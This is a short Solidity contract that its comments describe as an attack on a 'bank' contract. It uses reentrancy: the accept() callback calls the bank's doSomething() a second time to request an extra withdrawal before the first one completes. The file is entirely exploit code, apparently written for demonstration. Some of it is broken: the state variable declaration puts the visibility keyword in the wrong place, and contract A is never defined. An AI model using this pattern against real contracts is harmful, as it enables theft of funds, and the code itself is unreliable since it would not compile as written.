pragma solidity >=0.5.8;

contract C {
    uint onlyonce public = 0;
	// Set address of bank to be attacked.
	A public a = A("<put A address here>");
	// Send at least 1 wei as part of this call to deposit in the bank.
	function callme() public { a.doSomething(); }
	// Reset me.
	function reset() public { onlyonce = 0; }
	// Will request a second withdrawal of 1 wei from the bank.
	function accept() public {
	    if(onlyonce == 0){ onlyonce = onlyonce + 1; a.doSomething(); }
	}
}